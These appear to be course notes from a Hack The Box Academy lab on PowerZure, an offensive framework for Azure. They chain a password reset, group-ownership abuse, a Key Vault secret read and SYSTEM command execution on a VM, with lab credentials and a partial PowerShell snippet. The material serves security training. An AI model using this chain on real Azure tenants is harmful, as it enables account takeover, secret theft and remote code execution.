# 04.11 PowerZure Azure

> Chain `AZResetPassword` → `AZOwns` → group membership → Key Vault read → VM command execution with `PowerZure`.

## Overview

PowerZure is a PowerShell Azure offensive framework (analogous to PowerView for AD). The course demonstrates chaining AZResetPassword (Isabella → Charlotte) → AZOwns (Charlotte owns 'Subscription Reader' group) → add Charlotte to group → enumerate subscription objects → read Key Vault secret → execute commands on Azure VM. All three operations reach SYSTEM on the VM.

## Steps

- **AZResetPassword edge** → `Set-AzureADUserPassword` — change a user's password to gain access.
- **AZOwns edge** → `Add-AzureADGroupMember` — as owner, add any user to the group.
- **Re-run AzureHound after privilege escalation** to enumerate previously invisible subscription objects.
- **`Get-AzKeyVaultSecret`** — read Key Vault secrets (requires Key Vault Reader role or similar).
- **`Invoke-AzureRunCommand` / `Invoke-AzVMRunCommand`** — run commands on Azure VM as SYSTEM.
- **`Connect-AzAccount -Credential`** — authenticate; omit -Credential for interactive browser login.
- **Cancel Azure subscription** after exercises to avoid charges.

PS C:\Tools\PowerZure> $password = ConvertTo-SecureString "HacktheboxAcademy01!" -AsPlainText -Force

```powershell

# Connect as Ava:

    "[email protected]", (ConvertTo-SecureString "HacktheboxPwnCloud01" -AsPlainText -Force)

PS C:\Tools> Get-AzKeyVaultSecret -VaultName HTB-SECRETPLAINTEXT96519

PS C:\Tools> [System.Net.NetworkCredential]::new('', $secret.SecretValue).Password
# output: ImHack1nGTooM4ch!
```
